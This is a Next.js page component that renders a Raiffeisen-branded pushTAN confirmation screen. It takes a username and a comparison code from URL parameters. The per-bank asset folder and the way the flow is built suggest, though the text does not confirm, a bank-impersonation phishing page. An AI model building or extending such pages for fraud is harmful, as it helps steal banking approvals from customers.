import { redirect } from "next/navigation";
import Footer from "@/components/Footer";
import HelpButton from "@/components/HelpButton";
import PushTanCard from "@/components/PushTanCard";

type SearchParams = Promise<{ user?: string | string[]; code?: string | string[] }>;

export default async function PushTanPage({
  searchParams,
}: {
  searchParams: SearchParams;
}) {
  const sp = await searchParams;
  const raw = sp.user;
  const user = Array.isArray(raw) ? raw[0] : raw;
  const rawCode = sp.code;
  const code = Array.isArray(rawCode) ? rawCode[0] : rawCode;

  if (!user) {
    redirect("/");
  }

  return (
    <div
      className="min-h-screen flex flex-col login-bg"
      style={{
        backgroundImage: "url('/raiffeisen/bg-forest.jpg')",
        backgroundColor: "#2d5a27",
      }}
    >
      <main className="flex-1 flex flex-col">
        <PushTanCard user={user} vergleichswert={code} />
      </main>
      <Footer />
      <HelpButton />
    </div>
  );
}
